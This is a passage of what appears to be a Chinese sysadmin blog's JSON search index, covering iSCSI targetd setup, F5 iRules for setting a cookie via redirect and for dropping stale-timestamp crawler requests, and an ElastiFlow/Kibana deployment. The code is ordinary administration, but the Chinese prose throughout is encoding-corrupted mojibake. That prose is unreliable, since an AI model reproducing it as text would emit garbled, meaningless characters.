name\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# e.g vg-targetd/pool\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epool_name: vg-targetd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euser: admin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essl: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etarget_name: iqn.2020-04.com.ddky:renhe-18-30-18\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼Œè¿™ä¸ªæ–‡ä»¶ç”Ÿæˆåï¼Œå°±ä¸éœ€è¦æ”¹åŠ¨äº†ï¼Œå¦‚æœä»¥åtarget_nameå˜äº†ï¼Œä¹Ÿä¸ç”¨ç®¡ï¼Œä¹Ÿä¸éœ€è¦é‡å¯targetd\u003c/p\u003e\n\u003cp\u003eå¯åŠ¨æœåŠ¡ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e --now target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e --now targetd\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿è¡Œä¸€ä¸‹å‘½ä»¤ï¼Œçœ‹çœ‹æ˜¾ç¤ºç»“æœ\npvdisplay\nvgdisplay\nlvdisplay\ntargetcli ls /\u003c/p\u003e\n\u003cp\u003eæ³¨æ„ï¼šlvdisplayç»“æœå’Œtargetcli ls /ç»“æœéƒ½æ˜¯ç©º\u003c/p\u003e","title":"iscsiå·çš„è¿œç¨‹æŒ‚è½½ä½¿ç”¨"},{"content":"F5-Bigipåˆ©ç”¨iruleå¼ºè¡Œç»™è¯·æ±‚æ¤å…¥Cookieçš„æ–¹æ³•ã€‚\niruleæœ‰ä¸¤ç§åšæ³•å¯ä»¥è®©é“¾æ¥é‡å®šå‘\nHTTP::redirect \u0026quot;http://redirect.domain.com[HTTP::uri]\u0026quot;\ræˆ–è€…ï¼š\nHTTP::respond 302 Location \u0026quot;http://redirect.domain.com[HTTP::uri]\u0026quot; \u0026quot;locale\u0026quot; $cookie\ræˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¬¬äºŒç§æ–¹æ³•æ¥å¼ºè¡Œå¡è¿›cookie\nwhen HTTP_REQUEST {\rif {[HTTP::host] equals â€œfind.domain.comâ€ and [HTTP::path] equals â€œ/â€ } {\rset local_cookie [HTTP::cookie value lg_locale]\rset cookie [format \u0026quot;locale=%s; path=/; domain=%s\u0026quot; $local_cookie \u0026quot;\u0026lt;cookiedomain\u0026gt;\u0026quot;]\rHTTP::respond 302 Location â€œhttp://redirect.domain.com[HTTP::uri]â€ â€œSet-Cookieâ€ $cookie\r}\r}\rç»“æœï¼š ","permalink":"https://rendoumi.com/posts/20230727-f5_irule_cookie/","summary":"\u003cp\u003eF5-Bigipåˆ©ç”¨iruleå¼ºè¡Œç»™è¯·æ±‚æ¤å…¥Cookieçš„æ–¹æ³•ã€‚\u003c/p\u003e\n\u003cp\u003eiruleæœ‰ä¸¤ç§åšæ³•å¯ä»¥è®©é“¾æ¥é‡å®šå‘\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eHTTP::redirect \u0026quot;http://redirect.domain.com[HTTP::uri]\u0026quot;\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eæˆ–è€…ï¼š\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eHTTP::respond 302 Location \u0026quot;http://redirect.domain.com[HTTP::uri]\u0026quot; \u0026quot;locale\u0026quot; $cookie\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¬¬äºŒç§æ–¹æ³•æ¥å¼ºè¡Œå¡è¿›cookie\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ewhen HTTP_REQUEST {\r\n    if {[HTTP::host] equals â€œfind.domain.comâ€ and [HTTP::path] equals â€œ/â€ } {\r\n        set local_cookie [HTTP::cookie value lg_locale]\r\n        set cookie [format \u0026quot;locale=%s; path=/; domain=%s\u0026quot; $local_cookie \u0026quot;\u0026lt;cookiedomain\u0026gt;\u0026quot;]\r\n        HTTP::respond 302 Location â€œhttp://redirect.domain.com[HTTP::uri]â€ â€œSet-Cookieâ€ $cookie\r\n    }\r\n}\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eç»“æœï¼š\n\u003cimg alt=\"image-20230727133739834\" loading=\"lazy\" src=\"/posts/20230727-f5_irule_cookie/image-20230727133739834.png\"\u003e\u003c/p\u003e","title":"F5åˆ©ç”¨iruleå¼ºè¡Œæ¤å…¥cookie"},{"content":"F5-Bigipåˆ©ç”¨iruleé˜²æ­¢çˆ¬è™«çš„ä¸€æ³•ã€‚\nçˆ¬è™«çš„è¯·æ±‚ï¼š\nGET /cms/rest.htm?method=ddky.cms.search.recommend.h5.o2o\u0026amp;pageNo=1\u0026amp;pageSize=6\u0026amp;shopId=201790\u0026amp;ordertypeId=0\u0026amp;suite=1\u0026amp;searchType=o2o\u0026amp;searchPanel=1\u0026amp;wd=%E6%B4%9B%E4%B8%81%E6%96%B0\u0026amp;lat=22.520712193695\u0026amp;lng=113.9233553732\u0026amp;city=%E6%B7%B1%E5%9C%B3%E5%B8%82\u0026amp;type=90\u0026amp;unique=05685D2A5DAB8ABBD2E5E5B26E0C960F\u0026amp;versionName=5.7.5\u0026amp;plat=H5\u0026amp;platform=H5\u0026amp;t=2020-12-15%2014%3A19%3A11\u0026amp;v=1.0\u0026amp;sign=A6BD136BC1B6F91E5C7DD5A0DA03DD79\u0026amp;callback=jsonp1 é‡Œé¢çš„tå€¼æ˜¯æ—¶é—´ï¼Œt=2020-12-15%2014%3A19%3A11\nä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªå€¼ä¸€ç›´ä¸å˜äº†ï¼Œé‚£æˆ‘ä»¬å°±åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚å¦‚æœTå€¼è·Ÿå½“å‰æ—¶é—´å¯¹æ¯”ï¼Œæ˜¯3åˆ†é’Ÿå‰çš„ï¼Œé‚£å°±å°ï¼\nF5çš„iruleï¼Œç›´æ¥returnçš„æ˜¯ç™½åå•ï¼š\nwhen HTTP_REQUEST { set t [URI::decode [URI::query [HTTP::uri] t]] set before [clock scan \u0026#34;180 seconds ago\u0026#34; ] if { [IP::addr [IP::client_addr] equals 124.206.168.0/255.255.255.224]} { return} if { [IP::addr [IP::client_addr] equals 61.135.14.96/255.255.255.240]} { return} if { [IP::addr [IP::client_addr] equals 114.251.7.112/255.255.255.240]} { return} if { [string tolower [HTTP::uri]] contains \u0026#34;/cms/\u0026#34;} { if {$before \u0026gt; [clock scan $t]} { drop } } } ","permalink":"https://rendoumi.com/posts/20230727-f5_irule_t/","summary":"\u003cp\u003eF5-Bigipåˆ©ç”¨iruleé˜²æ­¢çˆ¬è™«çš„ä¸€æ³•ã€‚\u003c/p\u003e\n\u003cp\u003eçˆ¬è™«çš„è¯·æ±‚ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGET /cms/rest.htm?method\u003cspan class=\"o\"\u003e=\u003c/span\u003eddky.cms.search.recommend.h5.o2o\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003epageNo\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003epageSize\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e6\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eshopId\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e201790\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eordertypeId\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003esuite\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003esearchType\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eo2o\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003esearchPanel\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003ewd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e%E6%B4%9B%E4%B8%81%E6%96%B0\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003elat\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e22.520712193695\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003elng\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e113.9233553732\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003ecity\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e%E6%B7%B1%E5%9C%B3%E5%B8%82\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e90\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eunique\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e05685D2A5DAB8ABBD2E5E5B26E0C960F\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eversionName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e5.7.5\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eplat\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eH5\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eplatform\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eH5\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003et\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e2020-12-15%2014%3A19%3A11\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003ev\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1.0\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003esign\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eA6BD136BC1B6F91E5C7DD5A0DA03DD79\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003ecallback\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ejsonp1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé‡Œé¢çš„tå€¼æ˜¯æ—¶é—´ï¼Œt=2020-12-15%2014%3A19%3A11\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªå€¼ä¸€ç›´ä¸å˜äº†ï¼Œé‚£æˆ‘ä»¬å°±åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚å¦‚æœTå€¼è·Ÿå½“å‰æ—¶é—´å¯¹æ¯”ï¼Œæ˜¯3åˆ†é’Ÿå‰çš„ï¼Œé‚£å°±å°ï¼\u003c/p\u003e\n\u003cp\u003eF5çš„iruleï¼Œç›´æ¥returnçš„æ˜¯ç™½åå•ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-perl\" data-lang=\"perl\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ewhen\u003c/span\u003e \u003cspan class=\"n\"\u003eHTTP_REQUEST\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"n\"\u003eset\u003c/span\u003e \u003cspan class=\"n\"\u003et\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eURI::\u003c/span\u003e\u003cspan class=\"n\"\u003edecode\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eURI::\u003c/span\u003e\u003cspan class=\"n\"\u003equery\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eHTTP::\u003c/span\u003e\u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"n\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e]]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"n\"\u003eset\u003c/span\u003e \u003cspan class=\"n\"\u003ebefore\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eclock\u003c/span\u003e \u003cspan class=\"n\"\u003escan\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;180 seconds ago\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eIP::\u003c/span\u003e\u003cspan class=\"n\"\u003eaddr\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eIP::\u003c/span\u003e\u003cspan class=\"n\"\u003eclient_addr\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"n\"\u003eequals\u003c/span\u003e \u003cspan class=\"mf\"\u003e124.206.168.0\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"mf\"\u003e255.255.255.224\u003c/span\u003e\u003cspan class=\"p\"\u003e]}\u003c/span\u003e  \u003cspan class=\"p\"\u003e{\u003c/span\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eIP::\u003c/span\u003e\u003cspan class=\"n\"\u003eaddr\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eIP::\u003c/span\u003e\u003cspan class=\"n\"\u003eclient_addr\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"n\"\u003eequals\u003c/span\u003e \u003cspan class=\"mf\"\u003e61.135.14.96\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"mf\"\u003e255.255.255.240\u003c/span\u003e\u003cspan class=\"p\"\u003e]}\u003c/span\u003e  \u003cspan class=\"p\"\u003e{\u003c/span\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eIP::\u003c/span\u003e\u003cspan class=\"n\"\u003eaddr\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eIP::\u003c/span\u003e\u003cspan class=\"n\"\u003eclient_addr\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"n\"\u003eequals\u003c/span\u003e \u003cspan class=\"mf\"\u003e114.251.7.112\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"mf\"\u003e255.255.255.240\u003c/span\u003e\u003cspan class=\"p\"\u003e]}\u003c/span\u003e  \u003cspan class=\"p\"\u003e{\u003c/span\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003estring\u003c/span\u003e \u003cspan class=\"n\"\u003etolower\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eHTTP::\u003c/span\u003e\u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"p\"\u003e]]\u003c/span\u003e \u003cspan class=\"n\"\u003econtains\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;/cms/\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e  \u003cspan class=\"p\"\u003e{\u003c/span\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nv\"\u003e$before\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eclock\u003c/span\u003e \u003cspan class=\"n\"\u003escan\u003c/span\u003e \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e\u003cspan class=\"p\"\u003e]}\u003c/span\u003e  \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003edrop\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"F5åˆ©ç”¨iruleé˜²çˆ¬è™«"},{"content":"elasticflow æ˜¯ä¸ªæµé‡åˆ†æå·¥å…·ï¼Œé€šè¿‡å¯¹å„ç§flowæµé‡çš„æŠ“å–ï¼Œåˆ†ææ•°æ®ï¼Œå¯ä»¥æ¸…æ™°çš„çœ‹åˆ°å±€åŸŸç½‘ä¸­çš„æµé‡ã€‚\nç½‘ç®¡çš„å¿…å¤‡å•Šã€‚é¦–å…ˆè¦æŠŠsflowæµé‡ç»™å‘è¿‡æ¥ã€‚(è¿™é‡Œ172.18.31.23æ˜¯æœåŠ¡å™¨ç«¯)\nsflow collector 2 ip 172.18.31.23 description flow-server æ‹‰å–æºä»£ç ï¼š\ngit clone https://github.com/robcowart/elastiflow å¯åŠ¨é›†ç¾¤\ndocker-compose up -d è¿™æ ·æ•´ä¸ªæ•°æ®ä¼šè¢«æ¸…ç©ºï¼Œéœ€è¦é‡æ–°ç”Ÿæˆä¸€éï¼Œå…ˆæŠŠkibanaçš„æ•°æ®æ–‡ä»¶æ‹‰å›æ¥\nwget https://raw.githubusercontent.com/robcowart/elastiflow/master/kibana/elastiflow.kibana.7.8.x.ndjson ç„¶åç™»å½•http://172.18.31.23:5601\nå…ˆåˆ°é…ç½®ï¼Œå¯¼å…¥ å¯¼å…¥å¯¹è±¡ï¼Œé€‰æ‹©elastiflow.kibana.7.8.x.ndjsonæ–‡ä»¶ä¸Šä¼  å¯¼å…¥æˆåŠŸï¼Œå¯¼å…¥äº†300å¤šä¸ªå¯¹è±¡ ç„¶åé…ç½®ç´¢å¼•ï¼Œåº”è¯¥ä¸ç”¨é…ï¼Œç›´æ¥é€‰ä¸€ä¸ªåšdefault è¿™æ ·å°±okäº†ï¼Œå»dashboardçš„overviewå°±èƒ½çœ‹åˆ°ä¸œè¥¿äº† ç„¶åå»ä¿®æ”¹ä¸€ä¸‹shardç­–ç•¥ï¼Œçœå¾—ç´¢å¼•æŠ¥é»„è‰²\nPUT /_template/elastiflow-3.5.3\r{\r\u0026#34;index_patterns\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;settings\u0026#34;: {\r\u0026#34;number_of_shards\u0026#34;: 1\r}\r}\rPUT /_template/index_defaults {\r\u0026#34;index_patterns\u0026#34;: \u0026#34;*\u0026#34;,\r\u0026#34;settings\u0026#34;: {\r\u0026#34;number_of_shards\u0026#34;: 1\r}\r}\rPUT /_template/elastiflow-3.5.3\r{\r\u0026#34;index_patterns\u0026#34;: \u0026#34;elastiflow-3.5.3-*\u0026#34;, \u0026#34;settings\u0026#34;: {\r\u0026#34;number_of_shards\u0026#34;: 1\r}\r} æŸ¥çœ‹ä¸€ä¸‹ï¼š\ncurl -s -X GET \u0026#39;http://localhost:9200/_cat/indices?v\u0026#39;\rcurl -s -X GET \u0026#39;http://localhost:9200/_template\u0026#39;| jq ","permalink":"https://rendoumi.com/posts/20230724-elasticflow/","summary":"\u003cp\u003eelasticflow æ˜¯ä¸ªæµé‡åˆ†æå·¥å…·ï¼Œé€šè¿‡å¯¹å„ç§flowæµé‡çš„æŠ“å–ï¼Œåˆ†ææ•°æ®ï¼Œå¯ä»¥æ¸…æ™°çš„çœ‹åˆ°å±€åŸŸç½‘ä¸­çš„æµé‡ã€‚\u003c/p\u003e\n\u003cp\u003eç½‘ç®¡çš„å¿…å¤‡å•Šã€‚é¦–å…ˆè¦æŠŠsflowæµé‡ç»™å‘è¿‡æ¥ã€‚(è¿™é‡Œ172.18.31.23æ˜¯æœåŠ¡å™¨ç«¯)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esflow collector \u003cspan class=\"m\"\u003e2\u003c/span\u003e ip 172.18.31.23 description flow-server\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ‹‰å–æºä»£ç ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/robcowart/elastiflow\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¯åŠ¨é›†ç¾¤\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003edocker-compose up -d\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eè¿™æ ·æ•´ä¸ªæ•°æ®ä¼šè¢«æ¸…ç©ºï¼Œéœ€è¦é‡æ–°ç”Ÿæˆä¸€éï¼Œå…ˆæŠŠkibanaçš„æ•°æ®æ–‡ä»¶æ‹‰å›æ¥\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ewget https://raw.githubusercontent.com/robcowart/elastiflow/master/kibana/elastiflow.kibana.7.8.x.ndjson\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eç„¶åç™»å½•\u003ca href=\"http://172.18.31.23:5601\"\u003ehttp://172.18.31.23:5601\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eå…ˆåˆ°é…ç½®ï¼Œå¯¼å…¥\n\u003cimg loading=\"lazy\" src=\"/posts/20230724-elasticflow/2021-06-09_111258.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå¯¼å…¥å¯¹è±¡ï¼Œé€‰æ‹©elastiflow.kibana.7.8.x.ndjsonæ–‡ä»¶ä¸Šä¼ \n\u003cimg loading=\"lazy\" src=\"/posts/20230724-elasticflow/2021-06-09_111316.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå¯¼å…¥æˆåŠŸï¼Œå¯¼å…¥äº†300å¤šä¸ªå¯¹è±¡\n\u003cimg loading=\"lazy\" src=\"/posts/20230724-elasticflow/2021-06-09_111404.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åé…ç½®ç´¢å¼•ï¼Œåº”è¯¥ä¸ç”¨é…ï¼Œç›´æ¥é€‰ä¸€ä¸ªåšdefault\n\u003cimg loading=\"lazy\" src=\"/posts/20230724-elasticflow/2021-06-09_111511.png\"\u003e\n\u003cimg loading=\"lazy\" src=\"/posts/20230724-elasticflow/2021-06-09_111811.png\"\u003e\n\u003cimg loading=\"lazy\" src=\"/posts/20230724-elasticflow/2021-06-09_111841.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè¿™æ ·å°±okäº†ï¼Œå»dashboardçš„overviewå°±èƒ½çœ‹åˆ°ä¸œè¥¿äº†\n\u003cimg loading=\"lazy\" src=\"/posts/20230724-elasticflow/2021-06-09_113220.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åå»ä¿®æ”¹ä¸€ä¸‹shardç­–ç•¥ï¼Œçœå¾—ç´¢å¼•æŠ¥é»„è‰²\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePUT /_template/elastiflow-3.5.3\r\n{\r\n  \u0026#34;index_patterns\u0026#34;: \u0026#34;*\u0026#34;, \r\n  \u0026#34;settings\u0026#34;: {\r\n    \u0026#34;number_of_shards\u0026#34;: 1\r\n  }\r\n}\r\nPUT /_template/index_defaults \r\n{\r\n  \u0026#34;index_patterns\u0026#34;: \u0026#34;*\u0026#34;,\r\n  \u0026#34;settings\u0026#34;: {\r\n  \u0026#34;number_of_shards\u0026#34;: 1\r\n  }\r\n}\r\nPUT /_template/elastiflow-3.5.3\r\n{\r\n  \u0026#34;index_patterns\u0026#34;: \u0026#34;elastiflow-3.5.3-*\u0026#34;, \r\n  \u0026#34;settings\u0026#34;: {\r\n    \u0026#34;number_of_shards\u0026#34;: 1\r\n  }\r\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eæŸ¥çœ‹ä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecurl -s -X GET \u0026#39;http://localhost:9200/_cat/indices?v\u0026#39;\r\ncurl -s -X GET \u0026#39;http://localhost:9200/_template\u0026#39;| 